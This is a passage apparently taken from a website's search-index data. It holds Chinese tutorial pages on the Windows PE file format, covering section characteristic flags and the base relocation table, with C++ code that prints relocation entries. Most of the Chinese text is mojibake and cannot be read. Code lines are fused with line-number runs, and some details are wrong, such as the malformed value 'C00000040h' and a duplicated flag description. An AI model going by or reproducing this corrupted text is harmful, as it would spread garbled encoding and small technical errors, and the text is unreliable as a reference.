è¿˜é‡è¦ã€‚åœ¨è¿™ç§çŠ¶æ€ä¸‹ï¼Œå¿…é¡»å®Œå…¨ä½¿ç”¨çº¿æ€§æ˜ åƒçš„æ–¹æ³•è½½å…¥æ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦åœ¨è¯¥åç§»å¤„æ‰¾åˆ°å—çš„æ•°æ®ï¼Œè€Œä¸æ˜¯VirtualAddresså­—æ®µä¸­çš„RVAåœ°å€ã€‚ PointerToRelocationsï¼šåœ¨EXEæ–‡ä»¶ä¸­æ— æ„ä¹‰ï¼Œè®¾ç½®ä¸º0ã€‚åœ¨OBJæ–‡ä»¶ä¸­,è¡¨ç¤ºæœ¬å—é‡å®šä½ä¿¡æ¯çš„åç§»é‡ã€‚åœ¨OBJæ–‡ä»¶ä¸­ï¼Œå¦‚æœè¯¥å€¼ä¸æ˜¯0ï¼Œä¼šæŒ‡å‘ä¸€ä¸ªIMAGE_RELOCATIONç»“æ„æ•°ç»„ã€‚ PointerToLinenumbersï¼šè¡Œå·è¡¨åœ¨æ–‡ä»¶ä¸­çš„åç§»é‡ã€‚è¿™æ˜¯æ–‡ä»¶çš„è°ƒè¯•ä¿¡æ¯ã€‚è®¾ç½®ä¸º0ï¼Œå› ä¸ºCOFFè°ƒè¯•ä¿¡æ¯å·²è¢«å¼ƒç”¨ã€‚ NumberOfRelocationsï¼šåœ¨EXEæ–‡ä»¶ä¸­æ— æ„ä¹‰ã€‚åœ¨OBJæ–‡ä»¶ä¸­ï¼Œè¡¨ç¤ºæœ¬å—åœ¨é‡å®šä½è¡¨ä¸­çš„é‡å®šä½æ•°ç›®ã€‚è®¾ç½®ä¸º0ï¼Œå› ä¸ºCOFFè°ƒè¯•ä¿¡æ¯å·²è¢«å¼ƒç”¨ã€‚ NumberOfLinenumbersï¼šè¯¥å—åœ¨è¡Œå·è¡¨ä¸­çš„è¡Œå·æ•°ç›®ã€‚è®¾ç½®ä¸º0ï¼Œå› ä¸ºCOFFè°ƒè¯•ä¿¡æ¯å·²è¢«å¼ƒç”¨ã€‚ Characteristicsï¼šå—å±æ€§ã€‚è¯¥å­—æ®µæ˜¯ä¸€ç»„æŒ‡å‡ºå—å±æ€§ï¼ˆä¾‹å¦‚ä»£ç /æ•°æ®ã€å¯è¯»/å¯å†™ç­‰)çš„æ ‡å¿—ã€‚ä½æ©ç ã€‚ è¿™äº›æ ‡å¿—ä¸­çš„å¾ˆå¤šéƒ½å¯ä»¥é€šè¿‡é“¾æ¥å™¨çš„ISECTIONå¼€å…³è®¾ç½®ã€‚ å¸¸è§çš„ï¼š å€¼ ä½ å«ä¹‰ E0000020h 20000000h|40000000h|80000000h|00000020h è¯¥å—åŒ…å«æ‰§è¡Œä»£ç ï¼Œå¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œ C00000040h 40000000h|80000000h|00000040h è¯¥å—å¯è¯»ã€å¯å†™ï¼ŒåŒ…å«å·²åˆå§‹åŒ–çš„æ•°æ® 60000020h 20000000h|40000000h|00000020h è¯¥å—åŒ…å«æ‰§è¡Œä»£ç ï¼Œå¯è¯»ã€å¯æ‰§è¡Œ å€¼ å­—æ®µå€¼ å«ä¹‰ 0x00000020 IMAGE_SCN_CNT_CODE èŠ‚ä¸­åŒ…å«ä»£ç ï¼Œå¸¸ä¸10000000hä¸€èµ·è®¾ç½® 0x00000040 IMAGE_SCN_CNT_INITIALIZED_DATA èŠ‚ä¸­åŒ…å«å·²åˆå§‹åŒ–çš„æ•°æ® 0x00000080 IMAGE_SCN_CNT_UNINITIALIZED_DATA èŠ‚ä¸­åŒ…å«æœªåˆå§‹åŒ–çš„æ•°æ® 0x02000000 IMAGE_SCN_MEM_DISCARDABLE èŠ‚ä¸­çš„æ•°æ®å¯è¢«ä¸¢å¼ƒï¼Œå› ä¸ºå®ƒä¸€æ—¦è¢«è½½å…¥ï¼Œè¿›ç¨‹å°±ä¸å†éœ€è¦å®ƒäº†ã€‚å¸¸è§çš„å¯ä¸¢å¼ƒçš„å—æ˜¯.relocï¼ˆé‡å®šä½è¡¨ï¼‰ 00000100h IMAGE_SCN_LNK_OTHER ä¿ç•™ä¾›å°†æ¥ä½¿ç”¨ 04000000h IMAGE_SCN_MEM_NOT_CACHED èŠ‚ä¸­çš„æ•°æ®ä¸ä¼šç»è¿‡ç¼“å­˜ 08000000h IMAGE_SCN_MEM_NOT_PAGED èŠ‚ä¸­çš„æ•°æ®ä¸ä¼šç»è¿‡ç¼“å­˜ 0x10000000 IMAGE_SCN_MEM_SHARED è¯¥èŠ‚ä¸ºå…±äº«èŠ‚ï¼Œå°†è¢«ä¸åŒè¿›ç¨‹æ‰€å…±äº« 0x20000000 IMAGE_SCN_MEM_EXECUTE è¯¥èŠ‚å¯æ‰§è¡Œï¼Œæ˜ å°„åˆ°å†…å­˜åçš„é¡µé¢å…·æœ‰å¯æ‰§è¡Œå±æ€§ã€‚é€šå¸¸å½“00000020hæ ‡å¿—è¢«è®¾ç½®æ—¶ï¼Œè¯¥æ ‡å¿—ä¹Ÿè¢«è®¾ç½® 0x40000000 IMAGE_SCN_MEM_READ è¯¥èŠ‚å¯è¯»ï¼Œæ˜ å°„åˆ°å†…å­˜åçš„é¡µé¢å…·æœ‰å¯è¯»å±æ€§ã€‚å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„å—æ€»æ˜¯è®¾ç½®è¯¥æ ‡å¿—ã€‚ 0x80000000 IMAGE_SCN_MEM_WRITE è¯¥èŠ‚å¯å†™ï¼Œæ˜ å°„åˆ°å†…å­˜åçš„é¡µé¢å…·æœ‰å¯å†™å±æ€§ã€‚å¦‚æœPEæ–‡ä»¶ä¸­æ²¡æœ‰è®¾ç½®è¯¥æ ‡å¿—ï¼Œè£…è½½ç¨‹åºå°±ä¼šå°†å†…å­˜æ˜ åƒé¡µæ ‡è®°ä¸ºå¯è¯»æˆ–å¯æ‰§è¡Œ å‚è€ƒçš„å›¾ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// IMAGE_SCN_TYPE_REG 0x00000000 // Reserved.// IMAGE_SCN_TYPE_DSECT 0x00000001 // Reserved.// IMAGE_SCN_TYPE_NOLOAD 0x00000002 // Reserved.// IMAGE_SCN_TYPE_GROUP 0x00000004 // Reserved.#define IMAGE_SCN_TYPE_NO_PAD 0x00000008 // Reserved.// IMAGE_SCN_TYPE_COPY 0x00000010 // Reserved.#define IMAGE_SCN_CNT_CODE 0x00000020 // Section contains code.#define IMAGE_SCN_CNT_INITIALIZED_DATA 0x00000040 // Section contains initialized data.#define IMAGE_SCN_CNT_UNINITIALIZED_DATA 0x00000080 // Section contains uninitialized data.#define IMAGE_SCN_LNK_OTHER 0x00000100 // Reserved.#define IMAGE_SCN_LNK_INFO 0x00000200 // Section contains comments or some other type of information.// IMAGE_SCN_TYPE_OVER 0x00000400 // Reserved.#define IMAGE_SCN_LNK_REMOVE 0x00000800 // Section contents will not become part of image.#define IMAGE_SCN_LNK_COMDAT 0x00001000 // Section contents comdat.// 0x00002000 // Reserved.// IMAGE_SCN_MEM_PROTECTED - Obsolete 0x00004000#define IMAGE_SCN_NO_DEFER_SPEC_EXC 0x00004000 // Reset speculative exceptions handling bits in the TLB entries for this section.#define IMAGE_SCN_GPREL 0x00008000 // Section content can be accessed relative to GP#define IMAGE_SCN_MEM_FARDATA 0x00008000// IMAGE_SCN_MEM_SYSHEAP - Obsolete 0x00010000#define IMAGE_SCN_MEM_PURGEABLE 0x00020000#define IMAGE_SCN_MEM_16BIT 0x00020000#define IMAGE_SCN_MEM_LOCKED 0x00040000#define IMAGE_SCN_MEM_PRELOAD 0x00080000#define IMAGE_SCN_ALIGN_1BYTES 0x00100000 //#define IMAGE_SCN_ALIGN_2BYTES 0x00200000 //#define IMAGE_SCN_ALIGN_4BYTES 0x00300000 //#define IMAGE_SCN_ALIGN_8BYTES 0x00400000 //#define IMAGE_SCN_ALIGN_16BYTES 0x00500000 // Default alignment if no others are specified.#define IMAGE_SCN_ALIGN_32BYTES 0x00600000 //#define IMAGE_SCN_ALIGN_64BYTES 0x00700000 //#define IMAGE_SCN_ALIGN_128BYTES 0x00800000 //#define IMAGE_SCN_ALIGN_256BYTES 0x00900000 //#define IMAGE_SCN_ALIGN_512BYTES 0x00A00000 //#define IMAGE_SCN_ALIGN_1024BYTES 0x00B00000 //#define IMAGE_SCN_ALIGN_2048BYTES 0x00C00000 //#define IMAGE_SCN_ALIGN_4096BYTES 0x00D00000 //#define IMAGE_SCN_ALIGN_8192BYTES 0x00E00000 //// Unused 0x00F00000#define IMAGE_SCN_ALIGN_MASK 0x00F00000#define IMAGE_SCN_LNK_NRELOC_OVFL 0x01000000 // Section contains extended relocations.#define IMAGE_SCN_MEM_DISCARDABLE 0x02000000 // Section can be discarded.#define IMAGE_SCN_MEM_NOT_CACHED 0x04000000 // Section is not cachable.#define IMAGE_SCN_MEM_NOT_PAGED 0x08000000 // Section is not pageable.#define IMAGE_SCN_MEM_SHARED 0x10000000 // Section is shareable.#define IMAGE_SCN_MEM_EXECUTE 0x20000000 // Section is executable.#define IMAGE_SCN_MEM_READ 0x40000000 // Section is readable.#define IMAGE_SCN_MEM_WRITE 0x80000000 // Section is writeable. Sectionåœ¨å†…å­˜ä¸­åˆ†é…çš„ç©ºé—´å¤§å° åœ¨Sectionä¸­ï¼š æœªåˆå§‹åŒ–çš„æ•°æ®ï¼ˆå¦‚å£°æ˜äº†ä¸€äº›å…¨å±€å˜é‡ï¼Œä½†æ²¡æœ‰èµ‹åˆå€¼ï¼‰ï¼Œåœ¨ç£ç›˜ä¸­ä¸å æœ‰ç©ºé—´ï¼Œä½†å½“è¿™ä¸ªèŠ‚è½½å…¥å†…å­˜åè¦ç»™è¿™äº›æ•°æ®åˆ†é…å†…å­˜ç©ºé—´ï¼Œéšåinitialize and useå®ƒä»¬ã€‚ å·²åˆå§‹åŒ–çš„æ•°æ®ï¼ˆå¦‚å£°æ˜äº†ä¸€äº›å…¨å±€å˜é‡ï¼Œå¹¶èµ‹äº†åˆå€¼ï¼‰ï¼Œåœ¨ç£ç›˜ä¸­ä¼šå æœ‰ç©ºé—´ã€‚ è¿™æ„å‘³ç€ä¸€ä¸ªSecionå› ä¸ºå«æœ‰æœªåˆå§‹åŒ–çš„æ•°æ®ï¼Œå¯¼è‡´ä¼šå‡ºç°Miscï¼ˆè¯¥èŠ‚å®é™…çš„å¤§å°ï¼‰&gt;SizeOfRawDataï¼ˆè¯¥åŒºå—åœ¨ç£ç›˜æ–‡ä»¶ä¸­å¯¹é½åçš„å¤§å°ï¼‰çš„æƒ…å†µå‡ºç°ï¼Œé‚£ä¹ˆå½“è¯¥èŠ‚è½½å…¥å†…å­˜åï¼Œå®é™…åˆ†é…çš„ç©ºé—´æ˜¯Miscã€‚ç›¸åï¼Œå¦‚æœä¸€ä¸ªSecionçš„Miscï¼ˆè¯¥èŠ‚å®é™…çš„å¤§å°ï¼‰&lt;SizeOfRawDataï¼ˆè¯¥åŒºå—åœ¨ç£ç›˜æ–‡ä»¶ä¸­å¯¹é½åçš„å¤§å°ï¼‰ï¼Œé‚£ä¹ˆå½“è¯¥èŠ‚è½½å…¥å†…å­˜åï¼Œå®é™…åˆ†é…çš„ç©ºé—´æ˜¯SizeOfRawDataã€‚ å°ç»“ï¼Œå†…å­˜ä¸­Sectionåˆ†é…çš„ç©ºé—´ä¸ºmax{Misc,SizeOfRawData}ï¼Œå“ªä¸ªå¤§æŒ‰å“ªä¸ªåˆ†é…ã€‚"},{"title":"é‡å®šä½è¡¨","path":"/wiki/PE/é‡å®šä½è¡¨.html","content":"å‰è¨€ ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆEXEï¼‰çš„è¿›ç¨‹ç©ºé—´ä¸­åŒ…å«å¤šä¸ªæ¨¡å—ï¼Œå¦‚å…¶ä»–EXEæ–‡ä»¶å’ŒåŠ¨æ€é“¾æ¥åº“ï¼ˆDLLï¼‰ã€‚å½“ç³»ç»ŸåŠ è½½å™¨å°†æ¯ä¸ªæ¨¡å—è½½å…¥è¿›ç¨‹ç©ºé—´æ—¶ï¼Œæ¯ä¸ªæ¨¡å—éƒ½æœ‰ä¸€ä¸ªé¢„å®šçš„åŠ è½½åŸºåœ°å€ï¼ˆImageBaseï¼‰ã€‚å¯¹äºEXEæ–‡ä»¶ï¼Œå®ƒé€šå¸¸èƒ½å¤Ÿåœ¨å…¶æŒ‡å®šçš„ImageBaseåœ°å€åŠ è½½ï¼Œå› æ­¤ä¸éœ€è¦é‡å®šä½ä¿¡æ¯ã€‚ç„¶è€Œï¼ŒDLLåŠ è½½æ—¶ä¸èƒ½ä¿è¯æ¯æ¬¡åŠ è½½éƒ½èƒ½ä»å®ƒé¢„å®šçš„åŠ è½½åŸºå€åŠ è½½ã€‚ å‡è®¾æœ‰ä¸¤ä¸ªDLLæ–‡ä»¶ï¼ŒA.dllå’ŒB.dllï¼Œé»˜è®¤çš„åŠ è½½åŸºå€éƒ½æ˜¯0x10000000ã€‚å¦‚æœA.dllé¦–å…ˆåŠ è½½å¹¶å æ®äº†0x10000000ï¼Œéšåå½“ç³»ç»Ÿå°è¯•åŠ è½½B.dllæ—¶ï¼Œç”±äºè¯¥åœ°å€å·²è¢«å ç”¨ï¼Œç³»ç»Ÿåªèƒ½å°†B.dllåŠ è½½åˆ°å¦å¤–ä¸€ä¸ªä¸åŒçš„åŸºåœ°å€ã€‚ åŠ è½½åŸºåœ°å€çš„æ”¹å˜ä¸å½±å“ä½¿ç”¨ç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼ˆRVAï¼‰çš„æ•°æ®ï¼Œå› ä¸ºRVAæœ¬èº«å°±æ˜¯ä¸€ä¸ªç›¸å¯¹äºImageBaseçš„åç§»é‡ï¼Œè®¾è®¡ä¹‹åˆå°±æ˜¯ä¸ºäº†é€‚åº”è¿™ç§åŠ¨æ€è£…é…ã€‚ç„¶è€Œï¼Œå¯¹äºæ–‡ä»¶ä¸­ç¡¬ç¼–ç çš„åœ°å€ï¼ˆå³ç›´æ¥å†™å…¥çš„å®é™…å†…å­˜åœ°å€ï¼‰ï¼Œåˆ™éœ€è¦è¿›è¡Œåœ°å€ä¿®æ­£ã€‚å‡è®¾ä¸‹é¢è¿™æ®µä»£ç æ˜¯ä¸€ä¸ªexeæˆ–dllé‡Œçš„ï¼Œæœ‰å¯¹æ•°æ®åŒºå˜é‡çš„å¼•ç”¨ã€‚å½“ç¼–è¯‘å™¨ç¼–è¯‘ï¼Œå…¶å®å°±æ˜¯æŠŠæ±‡ç¼–æŒ‡ä»¤çš„äºŒè¿›åˆ¶æ•°å†™åˆ°PEæ–‡ä»¶ä¸­ã€‚ 12345678910#include &lt;stdio.h&gt;int x = 0x11;int main()&#123;\tprintf(&quot;%d &quot;,x);\treturn 0;&#125; 1234567: printf(&quot;%d &quot;,x);0040D408 A1 DC 4A 42 00 mov eax,[x (00424adc)]0040D40D 50 push eax0040D40E 68 80 2E 42 00 push offset string &quot;%d &quot; (00422e80)0040D413 E8 78 02 00 00 call printf (0040d690)0040D418 83 C4 08 add esp,8 åƒDC 4A 42 00ï¼ˆå˜é‡xï¼‰å’Œ80 2E 42 00ï¼ˆå­—ç¬¦ä¸²&quot;%d &quot;ï¼‰è¿™ä¸ªåœ°å€å°±æ˜¯ç¼–è¯‘å™¨ç¼–è¯‘æ—¶ç®—çš„â€œå†™æ­»â€çš„åœ°å€ï¼ˆç»å¯¹åœ°å€ï¼‰ï¼Œç„¶åè¿™ä¸ªâ€œå†™æ­»â€çš„åœ°å€ï¼ˆç»å¯¹åœ°å€ï¼‰è¢«å†™åˆ°PEæ–‡ä»¶é‡Œã€‚ å½“è¿™ä¸ªPEæ–‡ä»¶åœ¨åŠ è½½æ—¶ï¼Œå¦‚æœæŒ‰ç…§é¢„è®¾çš„ImageBaseè½½å…¥ï¼Œä¸Šé¢å¯¹å˜é‡xå’Œå­—ç¬¦ä¸²çš„å¼•ç”¨æ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚å¦‚æœè¿™ä¸ªPEæ–‡ä»¶åŠ è½½æ—¶ï¼Œæ²¡æœ‰æŒ‰é¢„è®¾çš„ImageBaseè½½å…¥ï¼Œè€Œæ˜¯ä»å¦å¤–ä¸€ä¸ªåŸºå€è½½å…¥ï¼Œç¨‹åºæ‰§è¡Œæ—¶ä»ç„¶æŒ‰DC 4A 42 00å’Œ80 2E 42 00æ¥ä½¿ç”¨è¿™ä¸ªå€¼ï¼Œè¿™ä¼šå¯¼è‡´ç¨‹åºå‡ºé”™ã€‚åƒè¿™ç§â€œå†™æ­»â€çš„åœ°å€ï¼Œå°±æ˜¯éœ€è¦ä¿®æ­£çš„åœ°æ–¹ã€‚ é‡å®šä½è¡¨å°±æ˜¯è¿™æ ·ä¸€å¼ è¡¨ï¼šè¡¨ä¸­è®°å½•äº†å½“å‰PEæ–‡ä»¶ä¸­æ‰€æœ‰â€œå†™æ­»â€çš„éœ€è¦ä¿®æ­£çš„è¿™äº›ä½ç½®çš„åœ°å€ã€‚å½“è¿™ä¸ªPEæ–‡ä»¶æœªèƒ½ä»é»˜è®¤çš„åŠ è½½åŸºå€è½½å…¥ï¼Œç³»ç»Ÿå°±å¯ä»¥é€šè¿‡é‡å®šä½è¡¨ä¸­çš„ä¿¡æ¯ï¼Œæ‰¾åˆ°è¿™äº›éœ€è¦ä¿®æ­£çš„åœ°å€è¿›è¡Œä¿®æ­£ï¼Œæ¥ç¡®ä¿æ¨¡å—çš„æ­£ç¡®æ‰§è¡Œã€‚ é‡å®šä½è¡¨ç»“æ„ ä»æ‹“å±•PEå¤´.æ•°æ®ç›®å½•è¡¨æ•°æ®çš„ç¬¬6ä¸ªæˆå‘˜å¾—åˆ°é‡å®šä½æ•°æ®çš„èµ·å§‹åœ°å€ï¼ˆè¿™ä¸ªå€¼æ˜¯RVAï¼‰å’Œå¤§å°ã€‚ 1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; DWORD Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; å°†RVAè½¬ä¸ºFOAåï¼Œæ‰¾è¿‡å»çš„å°±æ˜¯é‡å®šä½æ•°æ®çš„èµ·å§‹åœ°å€ã€‚é‡å®šä½æ•°æ®æ˜¯ç”±ä¸€å—ä¸€å—çš„é‡å®šä½å—ç»„æˆçš„ã€‚ æ¯ä¸ªé‡å®šä½å—éƒ½æ˜¯ä»¥PIMAGE_BASE_RELOCATIONç»“æ„ä½“å¼€å¤´ï¼Œ 123456typedef struct _IMAGE_BASE_RELOCATION &#123; DWORD VirtualAddress; DWORD SizeOfBlock;// WORD TypeOffset[1];&#125; IMAGE_BASE_RELOCATION;typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION; VirtualAddressï¼šå¤§å°4å­—èŠ‚ã€‚ SizeOfBlockï¼šå¤§å°4å­—èŠ‚ã€‚ TypeOffsetï¼š2å­—èŠ‚å¤§å°çš„æ•°ç»„ã€‚ æ¯ä¸ªé‡å®šä½å—æ˜¯ä¸å®šé•¿çš„ï¼Œå½“å‰é‡å®šä½å—çš„å¤§å°ç”±SizeOfBlockï¼ˆå•ä½ï¼šå­—èŠ‚ï¼‰æŒ‡å‡ºã€‚SizeOfBlockå‡å»8å­—èŠ‚ï¼ˆVirtualAddresså’ŒSizeOfBlockå…±å 8å­—èŠ‚ç©ºé—´ï¼‰å†/2å°±æ˜¯TypeOffsetæ•°ç»„çš„ä¸ªæ•°ã€‚ 1(RelocationDirectory-&gt;SizeOfBlock - 8) / 2 æ€ä¹ˆåˆ¤æ–­ä»€ä¹ˆæ—¶å€™åˆ°é‡å®šä½å—çš„æœ«å°¾ï¼Ÿä»¥å…¨0çš„IMAGE_BASE_RELOCATIONç»“æ„ä½“ï¼ˆ8å­—èŠ‚å…¨0ï¼‰ä½œä¸ºç»“æŸæ ‡å¿—ã€‚ éœ€è¦ä¿®æ­£çš„æ•°æ®çš„RVAåœ°å€æ˜¯é‡‡ç”¨é¡µåŸºå€+é¡µå†…åç§»çš„æ–¹å¼è®¡ç®—å¾—åˆ°ï¼šVirtualAddressåŸºå€+TypeOffsetæ•°ç»„æˆå‘˜ä¸­ä½12ä½ã€‚ æ³¨ï¼šTypeOffsetæ•°ç»„æˆå‘˜é«˜4ä½è¡¨ç¤ºé‡å®šä½ç±»å‹ï¼Œä½12ä½è¡¨ç¤ºåç§»åœ°å€ é‡å®šä½ç±»å‹ å«ä¹‰ IMAGE_REL_BASED_ABSOLUTE æ²¡æœ‰å…·ä½“å«ä¹‰ï¼Œåªæ˜¯ä¸ºäº†è®©æ¯ä¸ªæ®µ4å­—èŠ‚å¯¹é½ IMACE_REL_BASED_HIGHLOW é‡å®šä½æŒ‡å‘çš„æ•´ä¸ªåœ°å€éƒ½éœ€è¦ä¿®æ­£ï¼Œå®é™…ä¸Šå¤§éƒ¨åˆ†æƒ…å†µä¸‹éƒ½æ˜¯è¿™æ ·çš„ IMAGE_REL_BASED_DIR64 å‡ºç°åœ¨64ä½ PE æ–‡ä»¶ä¸­ï¼Œå¯¹æŒ‡å‘çš„æ•´ä¸ªåœ°å€è¿›è¡Œä¿®æ­£ åœ¨å†™ä»£ç æ—¶ï¼Œè¦å…ˆåˆ¤æ–­æ•°ç»„æ¯ä¸ªæˆå‘˜çš„é‡å®šä½ç±»å‹ï¼š åªæœ‰é‡å®šä½ç±»å‹ä¸ºIMACE_REL_BASED_HIGHLOWï¼ˆå€¼æ˜¯3ï¼‰çš„æ‰éœ€è¦è¿›è¡Œä¿®æ­£ å¦‚æœé‡å®šä½ç±»å‹æ˜¯IMAGE_REL_BASED_ABSOLUTEï¼Œè¯´æ˜è¿™ä¸ªæ•°ç»„æˆå‘˜åªæ˜¯å ä¸ªä½ç½®ï¼Œç›®çš„æ˜¯è®©é‡å®šä½å—æŒ‰4å­—èŠ‚å¯¹é½ï¼ˆæŒ‰ç»“æ„ä½“å¯¹é½è§„åˆ™ï¼Œä»¥ç»“æ„ä½“ä¸­æœ€å®½çš„æˆå‘˜å¯¹é½ï¼Œåœ¨IMAGE_BASE_RELOCATIONç»“æ„ä½“è¿™ä¸ªä¾‹å­ä¸­æœ€å®½çš„æˆå‘˜æ˜¯DWORDç±»å‹ï¼‰ã€‚ ä¸ºä»€ä¹ˆå¾…ä¿®æ­£çš„åœ°å€ç”¨è¿™ç§æ–¹å¼è¡¨ç¤ºï¼Ÿå‡è®¾éœ€è¦ä¿®æ­£çš„æ•°ç»„çš„åœ°å€æœ‰ï¼š1230x80001230x80004560x8000789æ–¹æ¡ˆä¸€ï¼šç”¨ä¸€ä¸ªDWORDæ•°ç»„æ¥å­˜123æ•°ç»„[0]=0x8000123;æ•°ç»„[1]=0x8000456;æ•°ç»„[2]=0x8000789;è¿™ç§æ–¹æ¡ˆæµªè´¹ç©ºé—´ã€‚æ–¹æ¡ˆäºŒï¼šé‡‡ç”¨åŸºå€+åç§»çš„æ–¹å¼æŒ‰ç…§ä¿æŠ¤æ¨¡å¼ä¸­é¡µå¼ç®¡ç†çš„çŸ¥è¯†ï¼Œä¸€ä¸ªç‰©ç†é¡µ4kbï¼Œå¯»å€4kbéœ€è¦12ä½0å’Œ1ï¼Œå³2^12æ¬¡æ–¹ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é‡‡ç”¨é¡µåŸºå€+é¡µå†…åç§»çš„æ–¹å¼æ¥è¡¨ç¤ºæœ€ç»ˆéœ€è¦ä¿®æ­£çš„æ•°æ®çš„åœ°å€12 DWORD VirtualAddress;// WORD TypeOffset[1];è¿™ç§æ–¹æ¡ˆä¸‹ï¼Œåªæœ‰VirtualAddresså DOWRDå¤§å°çš„ç©ºé—´ï¼Œé¡µå†…åç§»åªéœ€2å­—èŠ‚è¡¨ç¤ºï¼ŒèŠ‚çœå­˜å‚¨ç©ºé—´ã€‚å¦å¤–ï¼Œ2å­—èŠ‚ç›¸æ¯”12ä½å¤šäº†4ä½ï¼Œè¿™å››ä½ä¹Ÿåˆ©ç”¨èµ·æ¥ï¼Œç”¨æ¥è¡¨ç¤ºé‡å®šä½ç±»å‹ æ‰“å°é‡å®šä½å— æµ‹è¯•ç”¨çš„dllçš„æºç æ˜¯å¯¼å‡ºè¡¨-ä¾‹é‚£é‡Œçš„æºç ï¼Œåˆ†åˆ«ç”¨VCå’ŒVSç¼–è¯‘å¾—åˆ°çš„ä¸¤ä¸ªdll å‡½æ•°å®ç°æµ‹è¯•å‡½æ•°1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253VOID PEManipulator::PrintReloactionTable()&#123; // è·å–é‡å®šä½è¡¨æŒ‡é’ˆ auto pBaseReloc = (PIMAGE_BASE_RELOCATION)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_BASERELOC); if (!pBaseReloc) &#123; printf(&quot; [-] No Base Relocation Table found. &quot;); return; &#125; int iBlockIndex = 0; // ç¬¬å‡ ä¸ªé‡å®šä½å— while (pBaseReloc-&gt;VirtualAddress &amp;&amp; pBaseReloc-&gt;SizeOfBlock) &#123; printf(&quot; %d. Relocation Block: &quot;, iBlockIndex++); printf(&quot; VirtualAddress: 0x%08X &quot;, pBaseReloc-&gt;VirtualAddress); printf(&quot; SizeOfBlock: 0x%08X (%d block entries) &quot;, pBaseReloc-&gt;SizeOfBlock, (pBaseReloc-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD)); // å¯¹é½è¡¨å¤´ printf(&quot;\\t Index Offset Type Full RVA FOA DataAtFOA &quot;); printf(&quot;\\t ------- ------------ ------------ ------------ ------------ ------------ &quot;); // è·å–TypeOffsetæ•°ç»„çš„æŒ‡é’ˆ PWORD pTypeOffset = (PWORD)(pBaseReloc + 1); DWORD dwEntryCount = (pBaseReloc-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); for (DWORD i = 0; i &lt; dwEntryCount; i++) &#123; WORD wType = pTypeOffset[i] &gt;&gt; 12; // é«˜4ä½æ˜¯ç±»å‹ WORD wOffset = pTypeOffset[i] &amp; 0x0FFF; // ä½12ä½æ˜¯åç§» DWORD dwFullRVA = pBaseReloc-&gt;VirtualAddress + wOffset; if (wType == IMAGE_REL_BASED_HIGHLOW) // å¯¹äº HIGHLOW ç±»å‹ &#123; DWORD dwFullFOA = 0; if (!RVAToFOA(dwFullRVA, dwFullFOA)) &#123; return; &#125; DWORD dwDataAtFOA = *(PDWORD)((DWORD)m_lpFileBuffer + dwFullFOA); printf(&quot;\\t [%04d] 0x%08X HIGHLOW 0x%08X 0x%08X 0x%08X &quot;, i, wOffset, dwFullRVA, dwFullFOA, dwDataAtFOA); &#125; else if (wType == IMAGE_REL_BASED_ABSOLUTE) // å¯¹äº ABSOLUTE ç±»å‹ &#123; printf(&quot;\\t n/a ABSOLUTE &quot;); &#125; &#125; // ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªé‡å®šä½å— pBaseReloc = (PIMAGE_BASE_RELOCATION)((DWORD)pBaseReloc + pBaseReloc-&gt;SizeOfBlock); &#125;&#125;æµ‹è¯•å‡½æ•°1234567891011121314//æµ‹è¯•æ‰“å°é‡å®šä½è¡¨int TestPrintReloactionTable()&#123; PEManipulator PEFile(&quot;E:\\\\temp\\\\Export Table\\\\MyTest_VC.dll&quot;); //VCçš„ //PEManipulator PEFile(&quot;D:\\\\005_Codefield\\\\VS2019\\\\MyTestDll\\\\Debug\\\\MyTestDll.dll&quot;); //VSçš„ if (!PEFile.MapPEFile() || !PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; PEFile.PrintReloactionTable(); return 0;&#125; è¿è¡Œç»“æœçš„éƒ¨åˆ†æˆªå›¾ï¼š ï¼ˆç¬¬5ä¸ªå—çš„æ•°é‡å’ŒOffsetï¼Œä¸LordPEä¸Šæ˜¾ç¤ºçš„ä¸€æ ·ï¼‰ Bugè®°å½•æµ‹VCç¼–è¯‘çš„é‚£ä¸ªdllå‘ç°å´æ‰“å°ä¸å‡ºæ¥ï¼Œè°ƒè¯•å‘ç°æ˜¯é‡å®šä½è¡¨æŒ‡é’ˆçš„å€¼å–åˆ°37000hï¼Œè¿‡å»è¯»ï¼Œwhileè¡¨è¾¾å¼æ¡ä»¶ä¸æˆç«‹ï¼Œæ²¡è¿›whileå¾ªç¯ï¼Œé€€å‡ºäº†ã€‚æ€è€ƒå’Œè§£å†³çš„è¿‡ç¨‹ï¼šVCç¼–è¯‘çš„é‚£ä¸ªdllçš„æ–‡ä»¶å¯¹é½å’Œå†…å­˜å¯¹é½ä¸€æ ·ã€‚è¯´æ˜ä¸éœ€è¦RVA==FOAæ•°æ®ç›®å½•è¡¨æ˜¾ç¤ºé‡å®šä½è¡¨RVAæ˜¯37000hä½†å®é™…ä¸Š37000hæ˜¯æ–‡ä»¶æœ«å°¾äº†ç»§ç»­ç‚¹LordPE 